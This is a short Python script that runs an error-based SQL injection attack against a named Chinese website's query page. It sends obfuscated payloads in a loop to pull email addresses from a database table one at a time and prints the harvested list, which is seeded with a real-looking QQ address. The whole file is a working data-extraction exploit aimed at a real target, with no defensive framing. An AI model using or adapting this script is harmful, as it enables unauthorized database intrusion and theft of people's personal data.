import requests
import sys
reload(sys)
sys.setdefaultencoding( "utf-8" )
url='http://www.iuka.cn/chaxun'
mail_names=['1092022280@qq.com']
start=4398
while True:
	con="123'/**/and/**/convert(int,(select/**/top/**/1/**/aymail/**/from/**/ayname/**/where/**/aymail/**/not/**/in('"+"','".join(mail_names)+"')))=0-- "
	data={
		'con':con,
		'act':'cha'
	}
	r=requests.post(url,data=data)
	new_mail=str(r.text[start:-134])
	if new_mail=='':
		break
	mail_names.append(new_mail)
	start+=len(new_mail)+3
	print mail_names